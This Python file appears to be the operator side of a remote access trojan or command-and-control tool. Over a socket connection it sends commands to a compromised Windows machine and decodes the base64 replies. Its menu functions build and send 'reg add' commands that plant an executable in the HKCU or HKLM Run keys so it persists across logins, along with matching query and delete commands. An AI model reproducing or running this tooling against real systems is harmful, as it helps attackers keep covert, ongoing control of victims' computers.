from printlib import *
from sys import exc_info
import socket,base64
CONFIG = {"VERBOSE": True, "DEBUG": True}

def send_data(s, plain_text):
    msg = plain_text + "[END]"
    s.send(msg.encode('utf-8'))
    #s.send(encrypt(msg).encode('utf-8')+b"[END]")
    print_info("Sent:\n"  +plain_text)

def add_reg_persistence(conn):
    try:
        conn.settimeout(5)
        ans = print_question("Select Persistence Method:\n1 - HKEY_CURRENT_USER\n2 - HKEY_LOCAL_MACHINE (requires admin)\n")
        key_name = print_question("Name for Key")
        file_location = print_question("EXE Location")
        if ans == "1":
            cmd = r"reg add HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run /v {k} /t REG_SZ /d {q}{p}{q} /f".format(q='"',k=key_name,p=file_location)
            print_info("Command to Persist Under the Current User (on login):\n{}".format(cmd))
            ans = print_question("Run? [y/n]")
            if ans.lower() == "y":
                send_data(conn, cmd)
                listen_for_data(conn)

        if ans == "2":
            cmd = r"reg add HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run /v {k} /t REG_SZ /d {q}{p}{q} /f".format(q='"',k=key_name,p=file_location)
            print_info("Command to Persist (All Accounts on login):\n{}".format(cmd))
            ans = print_question("Run?[y/n]")
            if ans.lower() == "y":
                send_data(conn, cmd)
                listen_for_data(conn)
    except Exception as e:
        print(exc_info())
        print(e)
        print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))

def query_reg_persistence(conn):
    try:
        conn.settimeout(5)
        print("Queryable Keys:\n1 - HKEY_CURRENT_USER\n2 - HKEY_LOCAL_MACHINE")
        ans = print_question("Which Key")
        if ans == "1":
            cmd = r"reg query HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run"
            print_info("Command to Query:\n{}".format(cmd))
            ans = print_question("Run? [y/n]")
            if ans.lower() == "y":
                send_data(conn, cmd)
                listen_for_data(conn)
        elif ans == "2":
            cmd = r"reg query HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run"
            print_info("Command to Query:\n{}".format(cmd))
            ans = print_question("Run? [y/n]")
            if ans.lower() == "y":
                send_data(conn, cmd)
                listen_for_data(conn)
    except Exception as e:
        print(exc_info())
        print(e)
        print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))

def delete_reg_persistence(conn):
    try:
        conn.settimeout(5)
        print("1 - HKEY_CURRENT_USER\n2 - HKEY_LOCAL_MACHINE")
        hive = print_question("Which hive")
        if hive == "1":
            hive = "HKEY_CURRENT_USER"
        elif hive == "2":
            hive = "HKEY_LOCAL_MACHINE"
        ans = print_question("Enter Key Name to Delete")
        cmd = r"reg delete {h}\Software\Microsoft\Windows\CurrentVersion\Run /v {k} /f".format(k=ans,h=hive)
        print_info("Command to Run:\n{}".format(cmd))
        ans = print_question("Run? [y/n]")
        if ans.lower() == "y":
            send_data(conn, cmd)
            listen_for_data(conn)
    except Exception as e:
        print(exc_info())
        print(e)
        print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))

def listen_for_data(conn, mode="print",encoding="b64"):
    try:
        conn.settimeout(5)
        if CONFIG['DEBUG']:
            print_info("Waiting for data...")

        recv_total = ""
        recv_data = conn.recv(128).decode('utf-8')
        if encoding == "b64":
            recv_total = base64_decode(recv_data)
        else:
            recv_total = recv_data
        while '[END]' not in recv_total:
            #print(f"Received: {recv_total}\n-----------------")              
            if encoding == "b64":
                recv_total = recv_total + base64_decode(recv_data)
            else:
                recv_total = recv_total + recv_data
            recv_data = conn.recv(128).decode('utf-8')
        if mode != "print":
            return recv_total[:-5]
        else:
            print(WHITE + recv_total[:-5] + RSTCOLORS)
    except socket.timeout:
        print(recv_total[:-5])
    except Exception as e:
        print(exc_info())
        print(e)
        print_fail("Error on Line:{}".format(exc_info()[-1].tb_lineno))

def base64_decode(base64_message):
    base64_bytes = base64_message.encode('ascii')
    message_bytes = base64.b64decode(base64_bytes)
    message = message_bytes.decode('ascii')
    return message